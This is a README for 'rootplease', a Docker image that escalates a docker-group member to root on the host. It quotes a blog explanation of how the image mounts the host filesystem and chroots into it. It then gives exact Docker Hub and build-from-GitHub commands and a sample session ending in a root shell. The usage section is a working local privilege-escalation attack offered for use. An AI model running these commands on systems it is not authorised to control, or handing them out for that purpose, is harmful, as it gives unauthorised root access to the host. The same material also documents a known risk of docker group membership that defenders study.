Root Please
======================

Some important quoted text striped from Chris's blog.

*The command you run to perform the privilege escalation fetches my Docker image from the Docker Hub Registry and runs it. The -v parameter that you pass to Docker specifies that you want to create a volume in the Docker instance. The -i and -t parameters put Docker into ‘shell mode’ rather than starting a daemon process.*

*The instance is set up to mount the root filesystem of the host machine to the instance’s volume, so when the instance starts it immediately loads a chroot into that volume. This effectively gives you root on the machine.*

*There are many, many other ways to achieve this, but this was one of the most straightforward. You can find the code in the Github repo and the actual image on Docker Hub.*


**How to Use**

Through Docker Hub:

```bash
> docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
```
 
Or through Github:

```bash
> git clone https://github.com/chrisfosterelli/dockerrootplease rootplease
> cd rootplease/
> docker build -t rootplease .
> docker run -v /:/hostOS -i -t rootplease
```

And the result:

```bash
johndoe@testmachine:~$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
[...]
You should now have a root shell on the host OS
Press Ctrl-D to exit the docker instance / shell
# whoami
root
# 
```

So if you're a member of the 'docker' group on a machine, this command gives you a root shell on the host OS. [See Chris's blog post for details](https://fosterelli.co/privilege-escalation-via-docker.html).

